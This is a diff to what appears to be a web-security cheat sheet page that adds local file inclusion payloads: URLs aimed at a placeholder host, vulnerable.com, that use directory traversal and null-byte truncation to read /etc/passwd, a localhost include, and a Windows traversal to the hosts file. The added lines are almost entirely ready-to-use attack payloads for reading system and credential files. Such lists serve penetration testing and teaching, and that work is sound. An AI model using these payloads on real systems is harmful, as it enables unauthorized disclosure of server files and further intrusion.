@@ -11,6 +11,12 @@ render_with_liquid: false
 
 ```html
 https://vulnerable.com/index.php?page=/etc/passwd
+https://vulnerable.com/index.php?page=../../../../etc/passwd
+https://vulnerable.com/index.php?page=../../../../../../../../../../../../../../etc/passwd
+https://vulnerable.com/index.php?page=/etc/passwd%00
+https://vulnerable.com/index.php?page=/etc/passwd%00.inc
+https://vulnerable.com/index.php?page=/etc/passwd%00.php
+https://vulnerable.com/index.php?page=http://localhost/index
 
 <!-- Windows -->
 https://vulnerable.com/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
